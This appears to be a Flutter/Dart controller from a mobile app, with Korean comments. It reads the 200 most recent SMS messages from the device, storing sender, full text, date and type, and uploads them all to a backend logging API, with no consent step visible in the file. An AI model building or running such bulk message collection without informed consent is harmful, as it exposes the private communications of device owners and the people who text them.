import 'dart:developer';

import 'package:flutter_sms_intellect/flutter_sms_intellect.dart';
import 'package:get_storage/get_storage.dart';
import 'package:mobile/graphql/log_api.dart';

class SmsController {
  final box = GetStorage();

  static const storageKey = 'smsLogs';

  /// 최신 200개 SMS 가져와 로컬 저장 + 서버 업로드
  Future<void> refreshSms() async {
    // 1) 디바이스에서 200개 SMS 읽기
    final messages = await SmsInbox.getAllSms(count: 200);
    final smsList = <Map<String, dynamic>>[];
    for (final msg in messages) {
      // msg: SmsMessage
      final map = {
        'address': msg.address ?? '',
        'body': msg.body ?? '',
        'date': msg.date ?? 0, // epoch
        'type': msg.type ?? '', // 1=inbox,2=sent
      };
      smsList.add(map);
    }

    // 2) 로컬 저장
    await box.write(storageKey, smsList);

    // 3) 서버 업로드
    await _uploadToServer(smsList);
  }

  /// 서버 업로드
  Future<void> _uploadToServer(List<Map<String, dynamic>> localSms) async {
    final smsForServer =
        localSms.map((m) {
          final phone = m['address'] as String? ?? '';
          final content = m['body'] as String? ?? '';
          final timeStr = (m['date'] ?? '').toString();
          final smsType = (m['type'] ?? '').toString();

          return {
            'phoneNumber': phone,
            'time': timeStr,
            'content': content,
            'smsType': smsType,
          };
        }).toList();

    try {
      await LogApi.updateSMSLog(smsForServer);
    } catch (e) {
      log('[SmsController] 업로드 중 에러: $e');
    }
  }

  /// 로컬에 저장된 smsLogs 읽기
  List<Map<String, dynamic>> getSavedSms() {
    final list = box.read<List>(storageKey) ?? [];
    return list.map((e) => Map<String, dynamic>.from(e)).toList();
  }
}
